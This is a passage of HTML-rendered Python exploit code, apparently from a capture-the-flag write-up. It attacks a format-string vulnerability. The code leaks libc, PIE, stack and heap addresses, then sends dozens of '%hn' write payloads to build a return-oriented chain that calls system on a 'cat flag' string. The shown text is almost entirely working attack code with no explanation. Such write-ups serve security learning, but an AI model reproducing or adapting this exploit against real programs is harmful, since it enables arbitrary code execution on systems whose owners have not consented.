comment\">#7  栈地址</span>\n<span class=\"token comment\">#11 基地址0x82e</span>\n\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%7$p,\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"%11$p,\"</span> <span class=\"token operator\">+</span>  <span class=\"token string\">\"%9$p,\"</span>\n\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n\n__libc_start_main <span class=\"token operator\">=</span> rint<span class=\"token punctuation\">(</span><span class=\"token string\">\"0x7f62b26990b3\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">243</span>\nlibc_base <span class=\"token operator\">=</span> __libc_start_main <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"__libc_start_main\"</span><span class=\"token punctuation\">]</span>\n\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\",\"</span><span class=\"token punctuation\">)</span>\npie_addr <span class=\"token operator\">=</span> rint<span class=\"token punctuation\">(</span><span class=\"token string\">\"0x55d2c451e82e\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x82e</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\",\"</span><span class=\"token punctuation\">)</span>\nstack_addr <span class=\"token operator\">=</span> rint<span class=\"token punctuation\">(</span><span class=\"token string\">\"0x7fffa24e6e58\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xe0</span>\n\ngadget_addr <span class=\"token operator\">=</span> gadget <span class=\"token operator\">+</span> libc_base\n\n<span class=\"token triple-quoted-string string\">'''\nlg(\"__libc_start_main\",__libc_start_main)\nlg(\"gadget_addr\",gadget_addr)\nlg(\"pie_addr\",pie_addr)\nlg(\"stack_addr\",stack_addr)\n'''</span>\n\nbss_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x000000000201030</span> <span class=\"token operator\">+</span> pie_addr\n\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"bss_addr\"</span><span class=\"token punctuation\">,</span>bss_addr<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#gdb.attach(p,\"printf\")</span>\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%9$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>bss_addr <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">+</span><span class=\"token number\">2</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%9$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>bss_addr <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"niyah%11$sgalatea\"</span>\n\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyah\"</span><span class=\"token punctuation\">)</span>\nheap_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nret_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x000000000000065e</span> <span class=\"token operator\">+</span> pie_addr\npop_rdi_ret_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000000008f3</span> <span class=\"token operator\">+</span> pie_addr\nsystem_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> libc_base\n\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"ret_addr\"</span><span class=\"token punctuation\">,</span>ret_addr<span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"pop_rdi_ret_addr\"</span><span class=\"token punctuation\">,</span>pop_rdi_ret_addr<span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"heap_addr\"</span><span class=\"token punctuation\">,</span>heap_addr<span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"system_addr\"</span><span class=\"token punctuation\">,</span>system_addr<span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x100</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"/catflag\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#gdb.attach(p,\"printf\")</span>\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%9$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>ret_addr <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">+</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%9$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>ret_addr <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">+</span><span class=\"token number\">4</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%9$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>ret_addr <span class=\"token operator\">>></span> <span class=\"token number\">16</span> <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\n\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x8</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%9$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>pop_rdi_ret_addr <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">+</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x8</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%9$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>pop_rdi_ret_addr <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">+</span><span class=\"token number\">4</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x8</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%9$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>pop_rdi_ret_addr <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token operator\">>></span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%24$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>heap_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x30</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%24$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>heap_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x30</span> <span class=\"token punctuation\">)</span><span class=\"token operator\">>></span><span class=\"token number\">16</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%24$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>heap_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x30</span> <span class=\"token punctuation\">)</span><span class=\"token operator\">>></span><span class=\"token number\">16</span> <span class=\"token operator\">>></span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">+</span><span class=\"token number\">0x8</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%24$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>system_addr <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x8</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%24$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>system_addr <span class=\"token operator\">>></span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">+</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%24$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span 